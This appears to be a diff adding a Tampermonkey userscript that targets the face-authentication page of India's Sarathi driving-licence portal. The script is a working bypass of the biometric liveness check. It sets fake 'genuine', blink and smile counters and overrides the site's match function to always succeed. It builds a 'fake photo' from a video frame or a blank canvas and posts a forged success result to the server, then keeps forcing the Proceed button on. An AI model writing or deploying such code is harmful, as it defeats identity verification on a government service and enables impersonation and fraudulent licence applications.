@@ -1,0 +1,221 @@
+// ==UserScript==
+// @name        Pass Auth-Data To Server
+// @namespace    http://tampermonkey.net/
+// @version      4.20
+// @description  Sends applimg as CapPho only when user clicks the custom button (for https://sarathi.parivahan.gov.in/sarathiservice/authenticationaction.do)
+// @author       You
+// @match        https://sarathi.parivahan.gov.in/sarathiservice/authenticationaction.do*
+// @run-at       document-end
+// @grant        none
+// ==/UserScript==
+(function () {
+    'use strict';
+    function startObserver() {
+        'use strict';
+        // Wait for all required elements and scripts to load
+        const waitForElements = setInterval(() => {
+            if (typeof aware !== 'undefined' &&
+                document.querySelector('video') &&
+                document.getElementById('message')) {
+                clearInterval(waitForElements);
+                console.log("✅ Required elements found, starting bypass");
+                executeBypass();
+            }
+        }, 500);
+        function executeBypass() {
+            (async function restoreOriginalFlow() {
+                console.log("Restoring original face-aware flow");
+                if (typeof faceAuthStatus === "function") {
+                    try {
+                        await faceAuthStatus();
+                        console.log("faceAuthStatus completed");
+                    } catch (e) {
+                        console.error("faceAuthStatus failed:", e);
+                    }
+                }
+            })();
+            // 1. Set all success state variables immediately
+            window.isGenuine = true;
+            window.realFaceCount = 30;
+            window.spoofFaceCount = 0;
+            window.totalChecks = 40;
+            window.smileCounter = 20; // Updated from 5 to 20
+            window.blinkCount = 5;
+            window.spoofFaceCount = 0;
+            window.eyesClosed = 5; // Updated from 0 to 5
+            window.matchCount = 1;
+            // 2. Create a fake photo from the video
+            const video = document.querySelector('video');
+            let fakePhoto = null;
+            if (video && video.readyState >= 2) {
+                const tempCanvas = document.createElement('canvas');
+                tempCanvas.width = video.videoWidth || 300;
+                tempCanvas.height = video.videoHeight || 300;
+                const tempCtx = tempCanvas.getContext('2d');
+                tempCtx.drawImage(video, 0, 0, tempCanvas.width, tempCanvas.height);
+                fakePhoto = tempCanvas.toDataURL("image/jpeg", 0.5);
+                console.log("✅ Created fake photo from video");
+            } else {
+                // Create a blank canvas as fallback
+                const tempCanvas = document.createElement('canvas');
+                tempCanvas.width = 300;
+                tempCanvas.height = 300;
+                const tempCtx = tempCanvas.getContext('2d');
+                tempCtx.fillStyle = "#ffffff";
+                tempCtx.fillRect(0, 0, 300, 300);
+                fakePhoto = tempCanvas.toDataURL("image/jpeg", 0.5);
+                console.log("⚠ Created blank photo as fallback");
+            }
+            // 3. Directly override the return object with success values
+            window.returnObject = {
+                isMatch: false,
+                message: "Click on Proceed to validate your credentials",
+                nextExp: "",
+                photo: fakePhoto
+            };
+            // 4. Override aware.match to immediately resolve with success
+            const originalMatch = window.aware.match;
+            window.aware.match = function () {
+                console.log("🔄 Intercepted aware.match with direct success response");
+                // Create a successful result object
+                const result = {
+                    isMatch: false,
+                    message: "Click on Proceed to validate your credentials",
+                    nextExp: "",
+                    photo: fakePhoto
+                };
+                // Update UI immediately
+                if (window.messageToShown) {
+                    window.messageToShown.innerHTML = result.message;
+                }
+                // Enable the proceed button
+                if (document.getElementById('capphto1')) {
+                    document.getElementById('capphto1').disabled = false;
+                }
+                // Disable other elements
+                if (document.getElementById('capphto')) {
+                    document.getElementById('capphto').disabled = false;
+                }
+                if (document.getElementById('llappln')) {
+                    document.getElementById('llappln').disabled = false;
+                }
+                if (document.getElementById('pwd')) {
+                    document.getElementById('pwd').disabled = false;
+                }
+                // Send success data to server
+                const llappln = document.getElementById('llappln')?.value || '';
+                const rtocode = document.getElementById('rtocode')?.value || '';
+                try {
+                    $.ajax({
+                        type: 'POST',
+                        url: 'saveFaceAuthData.do',
+                        data: {
+                            applno: llappln,
+                            rtocode: rtocode,
+                            faceres: 1,  // 1 means success
+                            CapPho: fakePhoto
+                        },
+                        dataType: 'json',
+                        success: function (data) {
+                            var notify = document.createElement("div");
+                            notify.innerHTML = "✅ Server Accepted The Authentication Data <br><br> Click on Proceed To Validate Your Credentials";
+                            notify.style.position = "fixed";
+                            notify.style.top = "20px";
+                            notify.style.right = "20px";
+                            notify.style.background = "#28a745";
+                            notify.style.color = "#ffffff";
+                            notify.style.padding = "10px 15px";
+                            notify.style.fontSize = "14px";
+                            notify.style.borderRadius = "6px";
+                            notify.style.boxShadow = "0 4px 10px rgba(0,0,0,0.3)";
+                            notify.style.zIndex = "2147483647";
+                            notify.style.textAlign = "left";
+                            notify.style.maxWidth = "260px";
+                            notify.style.lineHeight = "1.4";
+                            document.body.appendChild(notify);
+                            setTimeout(function () {
+                                notify.remove();
+                            }, 5000);
+                        },
+                        error: function () {
+                            var notify = document.createElement("div");
+                            notify.innerHTML = "❌ Server Error While Sending Authentication Data<br><br>Upload New Photo And Try Again";
+                            notify.style.position = "fixed";
+                            notify.style.top = "20px";
+                            notify.style.right = "20px";
+                            notify.style.background = "#dc3545";
+                            notify.style.color = "#ffffff";
+                            notify.style.padding = "10px 15px";
+                            notify.style.fontSize = "14px";
+                            notify.style.borderRadius = "6px";
+                            notify.style.boxShadow = "0 4px 10px rgba(0,0,0,0.3)";
+                            notify.style.zIndex = "2147483647";
+                            notify.style.maxWidth = "260px";
+                            notify.style.lineHeight = "1.4";
+                            notify.style.fontFamily = "Arial, sans-serif";
+                            document.body.appendChild(notify);
+                            setTimeout(function () {
+                                notify.remove();
+                            }, 5000);
+                        }
+                    });
+                } catch (err) {
+                    console.log("⚠ Error sending data: " + err.message);
+                }
+                // Return the successful result
+                return Promise.resolve(result);
+            };
+            // 6. Directly trigger the authentication flow
+            console.log("🚀 Directly triggering authentication success");
+            // Update UI to show final success message
+            if (document.getElementById('message')) {
+                document.getElementById('message').innerHTML = "Click on Proceed to validate your credentials";
+            }
+            // Find and enable the proceed button
+            if (document.getElementById('capphto1')) {
+                document.getElementById('capphto1').disabled = false;
+            }
+            // Directly call match to trigger the success flow
+            window.aware.match().then(result => {
+                console.log("✅ Match completed with result:", result);
+                const proceedBtn = document.getElementById('capphto1');
+                if (proceedBtn) {
+                    proceedBtn.disabled = false;
+                    console.log("✅ Proceed button initially enabled");
+                    // Watch the button every second
+                    const watchProceed = setInterval(() => {
+                        if (proceedBtn.disabled) {
+                            console.log("🔁 Proceed button was disabled — re-enabling now");
+                            proceedBtn.disabled = false;
+                        }
+                    }, 1000); // check every second
+                }
+            });
+        }
+    }
+    // 🔵 Create Floating Button
+    const btn = document.createElement("button");
+    btn.innerText = "Send Auth-Data To Server";
+    btn.style.position = "fixed";
+    btn.style.bottom = "20px";
+    btn.style.right = "20px";
+    btn.style.padding = "10px 15px";
+    btn.style.background = "#ff9800"; // orange
+    btn.style.color = "#000"; // black text
+    btn.style.border = "none";
+    btn.style.borderRadius = "8px";
+    btn.style.cursor = "pointer";
+    btn.style.zIndex = "999999";
+    btn.style.boxShadow = "0 4px 10px rgba(0,0,0,0.3)";
+    btn.style.transition = "transform 0.1s ease"; // smooth animation
+    btn.onclick = () => {
+        btn.style.transform = "scale(0.9)"; // shrink
+        setTimeout(() => {
+            btn.style.transform = "scale(1)"; // back to normal
+        }, 100);
+
+        startObserver(); // your function
+    };
+
+    document.body.appendChild(btn);
+})();
